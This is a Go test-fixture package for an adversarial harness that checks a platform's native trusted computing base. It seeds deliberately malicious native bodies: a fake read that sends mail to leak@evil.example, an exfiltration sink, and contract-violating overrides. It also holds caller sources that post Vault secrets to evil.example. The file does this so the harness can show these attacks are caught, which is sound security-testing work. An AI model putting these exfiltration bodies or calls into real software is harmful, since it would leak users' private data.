// Package nativetcb is the ADR-10 §8 native-TCB adversarial harness corpus —
// co-equal with ADR-07 §5's gate/redpath, but aimed one ring lower: at the
// native-Go std bodies (vault routing, capability egress, crypto, the derivation
// passes) that hold the REAL authority and that no verifier examines. redpath
// attacks the ADMISSION boundary with hostile SOURCE; this package attacks the
// native FLOOR with deliberately-malicious NATIVE BODIES and proves the
// surrounding machinery catches each — or records, as data, exactly what the TCB
// is trusted for.
//
// Unlike gate/redpath (pure stdlib data — a hostile fixture is a source string),
// a native-TCB fixture is a real Go native body (a cek.NativeFn), so this package
// necessarily imports internal/cek. It imports NOTHING else and is imported only
// by the ONE runner (internal/admission/nativetcb_test.go) that drives each
// fixture through the real machinery against a scratch Postgres. The evil bodies
// here are NEVER placed in the shipped genesis image: the effect-order and
// exfil fixtures compute their own NativeBody hashes (absent from the roster —
// the runner asserts it), and the contract-violation fixture overrides a genesis
// body only inside a locally-constructed test registry, never the process image.
package nativetcb

import "regel.dev/regel/internal/cek"

// The three ADR-10 §8 threat classes. These are the monotone coverage keys
// (native_tcb_coverage.threat_class) — a class once covered may never be dropped.
const (
	ClassVaultLeak    = "vault-leak"
	ClassContractViol = "contract-violation"
	ClassEffectOrder  = "effect-order"
)

// --- the seeded evil native bodies (registerable ONLY under test) -------------

// EvilReadRecordsExternal is an effect-order attack: a native DECLARED `read`
// (inline, no checkpoint — re-execution after a crash is safe) whose body LIES by
// recording an external effect. The control: the ADR-10 §6 std-conformance gate in
// performNative catches a read-declared native that records any effect and fails
// closed (never a committed effect). Registered under a FIXTURE hash absent from
// the roster.
func EvilReadRecordsExternal(h *cek.Host, _ []cek.Value) (cek.Value, *cek.NativePark) {
	h.RecordEffect("mail.send", map[string]any{"to": "leak@evil.example"})
	return cek.NumV(1), nil
}

// EvilExfilSink is the vault-leak COUNTERFACTUAL: a native holding real egress
// authority that exfiltrates any value handed to it. It is not caught by any
// control once it holds a plaintext — that is the whole point. The harness runs it
// directly to demonstrate the authority (it DOES leak), which is precisely why V2
// must bound the CALLER so a Vault value never reaches such a native unmasked. The
// residue it witnesses is recorded as a trusted-for statement, never a silent pass.
func EvilExfilSink(h *cek.Host, args []cek.Value) (cek.Value, *cek.NativePark) {
	leaked := ""
	if len(args) > 0 && args[0].Tag == cek.TagStr {
		leaked = args[0].S
	}
	h.RecordEffect("exfil", map[string]any{"leaked": leaked})
	return cek.UndefV(), nil
}

// EvilPostSkipsPostcondition is a contract-violation attack: an evil variant of
// std/contract.post whose runtime behavior DIVERGES from its declared contract —
// the honest body parks contract.post.violated on a falsy clause; this one SKIPS
// the check and always passes. The control: the ADR-04 §6 differential oracle —
// the production machine (running this evil body) reports a value where the
// independent reference reducer reports violation:post, so the oracle diverges RED.
func EvilPostSkipsPostcondition(_ *cek.Host, _ []cek.Value) (cek.Value, *cek.NativePark) {
	return cek.UndefV(), nil
}

// EvilMailReturnsOutOfType is a second contract-violation attack: an evil variant
// of std/mail.send that records the effect faithfully (so the effect-order
// observable stays aligned) but returns a NUMBER where its declared signature
// returns a { intent, to, subject } record — an out-of-type return. The control:
// the differential oracle diverges on the produced-value observable (the caller's
// `.subject` member read is undefined on the production side, the record's value
// on the reference side).
func EvilMailReturnsOutOfType(h *cek.Host, _ []cek.Value) (cek.Value, *cek.NativePark) {
	h.RecordEffect("mail.send", map[string]any{})
	return cek.NumV(42), nil
}

// --- fixture descriptors ------------------------------------------------------

// EffectFixture is one effect-order seeded native: an evil body + its declared
// (lying) effect class + the caller that invokes it.
type EffectFixture struct {
	Name       string
	Intrinsic  string       // the fixture NativeBody intrinsic symbol (NOT a roster name)
	DeclClass  string       // the declared effect class the body lies about
	Native     cek.NativeFn // the evil body
	CallerSrc  string       // a module that imports and calls the evil native
	CallerMod  string
	Entry      string // exported fn to run
	WantEffect string // the effect class the body illicitly records
}

// EffectFixtures is the effect-order threat family.
var EffectFixtures = []EffectFixture{
	{
		Name: "read-declared-records-external", Intrinsic: "std/evilread.peek",
		DeclClass: "read", Native: EvilReadRecordsExternal, WantEffect: "mail.send",
		CallerMod: "app/etcb1", Entry: "f",
		CallerSrc: `import { peek } from "std/evilread";
export function f(): number {
  return peek();
}
`,
	},
}

// VaultLeakFixture is one vault-leak admission fixture: a malicious CALLER that
// routes a Vault value into a capability-bearing egress sink unmasked. The
// surrounding control (V2 pii-flow over the caller + the six masking leaves)
// refuses admission with ExpectCode, so the evil native never runs — a native
// cannot become a laundering path around masking.
type VaultLeakFixture struct {
	Name       string
	Module     string
	Declared   map[string][]string // per-def declared capabilities (short def name → caps)
	Source     string
	ExpectCode string
}

// VaultLeakFixtures is the vault-leak threat family's admission leg. Both sinks are
// capability-bearing (mail.send, http.get) — the set V2 recognizes. (std/log.write
// is ALSO an egress authority per ADR-10 §3 but bears no capability in the D0
// roster, so V2's capability-keyed sink set does not yet include it — a named
// residue, see RESIDUE_LOG_SINK below.)
var VaultLeakFixtures = []VaultLeakFixture{
	{
		Name: "vault-into-mail-sink", Module: "app/vtcb1", ExpectCode: "PII_ESCAPE",
		Declared: map[string][]string{"leak": {"mail.send"}},
		Source: `import { send } from "std/mail";
import type { Vault } from "std/pii";
export function leak(owner: Vault<string>): void {
  send("ops@example.com", owner);
}
`,
	},
	{
		Name: "vault-into-http-sink", Module: "app/vtcb2", ExpectCode: "PII_ESCAPE",
		Declared: map[string][]string{"leak": {"http.post"}},
		Source: `import { post } from "std/http";
import type { Vault } from "std/pii";
export function leak(secret: Vault<string>): void {
  post("https://evil.example/collect", secret);
}
`,
	},
}

// ContractViolFixture is one contract-violation seeded native: an evil body that
// OVERRIDES a genesis std native (by intrinsic) inside a test-only registry, plus
// the oracle-corpus case + input vector on which the honest and evil bodies
// diverge. The control (ADR-04 §6 differential oracle) reports the divergence RED.
type ContractViolFixture struct {
	Name          string
	OverrideIntr  string       // the genesis intrinsic whose body the evil one replaces
	Native        cek.NativeFn // the evil body installed at that intrinsic's hash
	OracleCase    string       // the oracle.Corpus case name to drive
	DivergentKind string       // "verdict" | "value" — which observable must diverge
}

// ContractViolFixtures is the contract-violation threat family.
var ContractViolFixtures = []ContractViolFixture{
	{
		Name: "post-skips-declared-postcondition", OverrideIntr: "std/contract.post",
		Native: EvilPostSkipsPostcondition, OracleCase: "post-boundary-validator",
		DivergentKind: "verdict",
	},
	{
		Name: "mail-returns-out-of-type", OverrideIntr: "std/mail.send",
		Native: EvilMailReturnsOutOfType, OracleCase: "effect-order-two-mails",
		DivergentKind: "value",
	},
}

// --- trusted-for inventory (the irreducible TCB, stated as data) --------------

// Disposition classifies an authority-holding native: either a surrounding control
// CATCHES its misuse, or its authority is irreducible and the TCB is TRUSTED-FOR an
// explicit statement — never a silent pass (ADR-10 §8 release-gate rule).
type Disposition struct {
	Native     string // the native (roster intrinsic) or authority site
	CaughtBy   string // the control that catches its misuse ("" ⇒ irreducible)
	TrustedFor string // the irreducible trust statement ("" ⇒ fully caught)
}

// AuthorityInventory enumerates every native/site that holds real authority and
// classifies it. The runner cross-checks this against the D0 roster: every roster
// native carrying a capability OR a declared effect class MUST appear here (no
// silent authority). Class-level irreducible-TCB statements (crypto, the vault KDF,
// the derivation passes, the unrecorded-I/O residue) are recorded too.
var AuthorityInventory = []Disposition{
	// --- capability-bearing egress sinks: caught on the CALLER by V2 + V1 ------
	{Native: "std/mail.send",
		CaughtBy:   "V2 pii-flow treats it as a boundary sink over the caller's AST + V1 capability-audit; effect-order conformance guards its declared `external` class",
		TrustedFor: "holds real egress authority: a grant-gated REVEALED value handed to it can be re-exfiltrated — V2 bounds the unmasked-Vault-in path, not the post-reveal authority"},
	{Native: "std/http.get",
		CaughtBy:   "V2 outbound sink over the caller + V1 capability-audit (http.get)",
		TrustedFor: "outbound egress authority: a revealed value it is legitimately handed is trusted not to be re-exfiltrated"},
	{Native: "std/http.post",
		CaughtBy:   "V2 outbound sink over the caller + V1 capability-audit (http.post)",
		TrustedFor: "outbound egress authority: a revealed value it is legitimately handed is trusted not to be re-exfiltrated"},
	{Native: "std/log.write",
		CaughtBy:   "V2 pii-flow non-capability external-sink arm over the caller (isBoundarySink keys on the declared `external` effect class, ADR-10 §3/§8) + the §6 effect-order conformance gate guards the effect-class declaration the arm relies on",
		TrustedFor: "the log egress authority: a grant-gated REVEALED value legitimately handed to log.write is trusted not to be re-exfiltrated — V2 bounds the unmasked-Vault-in path, not the post-reveal authority (same statement as the capability egress sinks). BUILD-E: RESIDUE_LOG_SINK closed via the minimal-diff non-capability sink arm (no roster change, no epoch bump)"},
	// --- read-declared session/clock/erf reads: caught by the §6 conformance gate
	{Native: "std/identity.currentUser",
		CaughtBy:   "effect-order conformance gate (read-declared; a recorded effect fails closed)",
		TrustedFor: "the session-context read authority itself (it returns whoever the session binds) is trusted"},
	{Native: "std/identity.currentOrg",
		CaughtBy:   "effect-order conformance gate (read-declared)",
		TrustedFor: "the session-context read authority is trusted"},
	{Native: "std/time.now",
		CaughtBy:   "effect-order conformance gate (read-declared; recording an effect fails closed)",
		TrustedFor: "the nondeterministic clock authority is trusted (harmless-but-uncheckable)"},
	{Native: "std/erf.read",
		CaughtBy:   "effect-order conformance gate (read-declared) + V3 policy predicate injected into every derived read path",
		TrustedFor: "the row-read authority is bounded by the injected policy predicate; the native is trusted to honor it"},
	{Native: "std/erf.list",
		CaughtBy:   "effect-order conformance gate (read-declared) + V3 policy predicate on the derived read path",
		TrustedFor: "the collection-read authority is bounded by the injected policy predicate"},
	{Native: "std/sql.query",
		CaughtBy:   "V1 capability-audit (sql.query declared+granted) + ENGINE-enforced SELECT-only: every read runs inside a READ ONLY transaction so PG refuses any write side effect a SELECT-prefixed statement still carries (nextval/setval/volatile writes/data-modifying CTE), with isReadOnlySQL as defense-in-depth (fails a non-SELECT closed before PG) + effect-order conformance gate (read-declared: a recorded effect fails closed). R1 fixture family (25 hostile cases) proves params are unbreakably bound as $1 and no case writes/drops/escapes (ADR-10 §4 BUILD-F R1)",
		TrustedFor: "the parameterized read authority: the caller's SQL text is trusted to carry the org/policy predicate the query author wrote — v1 std/sql does not yet inject a policy predicate the way erf reads do (a cross-org SELECT is bounded by the capability grant + the engine-enforced SELECT-only surface, not by an auto-injected WHERE org clause). Named residue: policy-predicate injection into std/sql reads is a later increment"},
	{Native: "std/taak.schedule",
		CaughtBy:   "the ADR-05 §7 step transaction: the cron.schedule effect materializes its durable cron task row inside the committing step (atomic with the checkpoint), and the reactor's cron driver claims each due tick exactly once (FOR UPDATE SKIP LOCKED + atomic run_at advance)",
		TrustedFor: "the recurring-spawn authority: a scheduled cron row fires its target workflow every interval under the system principal — the schedule content (interval, target) is trusted as the scheduling workflow authored it; each fired workflow's own effects remain exactly-once by the step transaction"},
	// --- irreducible kernel/crypto/derivation authority (class-level) ----------
	{Native: "std/crypto.aeadSeal",
		CaughtBy:   "",
		TrustedFor: "the AES-256-GCM AEAD (Go crypto/aes + crypto/cipher) is trusted to be the vetted primitive — no surrounding control can prove the cipher correct"},
	{Native: "std/crypto.aeadOpen",
		CaughtBy:   "",
		TrustedFor: "the AES-256-GCM open path is trusted to authenticate correctly (a forged tag fails closed to the mask token)"},
	{Native: "vault.keyDerivation",
		CaughtBy:   "",
		TrustedFor: "the per-subject key-token KDF (SHA-256(token)) and the seal-to-ciphertext-only write are trusted; crypto-shred deletes the key row, after which the ciphertext is undecryptable by construction"},
	{Native: "derivation.passes",
		CaughtBy:   "V6 derivation-parity checks the emitted pass SET equals the required ten (a suppressed vault/policy pass ⇒ DERIVE_PARITY)",
		TrustedFor: "the INTERNAL correctness of each pass body (that the vault route actually routes the pii field, that the policy predicate actually scopes) is trusted — V6 checks pass presence, not pass content"},
	{Native: "native.unrecordedIO",
		CaughtBy:   "",
		TrustedFor: "a native performing real side-effecting I/O WITHOUT calling RecordEffect is invisible to the effects-trace conformance and the outbox accounting; native bodies are trusted not to perform unrecorded I/O — ADR-10 §2's H_dispatch attestation pins WHICH body runs, bounding this residue to the vetted roster"},
}
